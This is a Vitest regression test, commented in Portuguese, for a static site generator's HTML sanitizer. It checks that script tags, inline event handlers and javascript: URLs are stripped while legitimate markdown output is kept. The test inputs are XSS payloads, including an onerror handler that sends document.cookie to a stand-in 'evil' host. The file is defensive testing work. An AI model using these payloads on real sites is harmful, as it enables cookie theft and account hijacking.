import { describe, it, expect } from "vitest";
import { sanitizeHtml } from "../lib/sanitizeHtml";

/**
 * Regressão do achado B-02: o HTML pré-renderizado no SSG precisa ser saneado
 * com a mesma política do SPA. Se alguém remover o sanitizeHtml do
 * generate-post-pages.ts, ou trocar por uma versão permissiva, estes testes
 * falham. Os payloads simulam o que uma injeção de prompt via RSS poderia
 * fazer chegar ao corpo do post.
 */
describe("sanitizeHtml (SSG)", () => {
  it("remove tags <script>", () => {
    const out = sanitizeHtml('<p>ok</p><script>alert(document.cookie)</script>');
    expect(out).not.toContain("<script");
    expect(out).toContain("<p>ok</p>");
  });

  it("remove handlers de evento inline (onerror)", () => {
    const out = sanitizeHtml('<img src="x" onerror="fetch(\'//evil/\'+document.cookie)">');
    expect(out.toLowerCase()).not.toContain("onerror");
  });

  it("remove URLs javascript: em links", () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">clique</a>');
    expect(out.toLowerCase()).not.toContain("javascript:");
  });

  it("preserva markdown legítimo (títulos, listas, código, links http)", () => {
    const out = sanitizeHtml(
      '<h2>Título</h2><ul><li>item</li></ul><pre><code>const x = 1;</code></pre><a href="https://exemplo.com">link</a>'
    );
    expect(out).toContain("<h2>Título</h2>");
    expect(out).toContain("<li>item</li>");
    expect(out).toContain("<code>const x = 1;</code>");
    expect(out).toContain('href="https://exemplo.com"');
  });
});
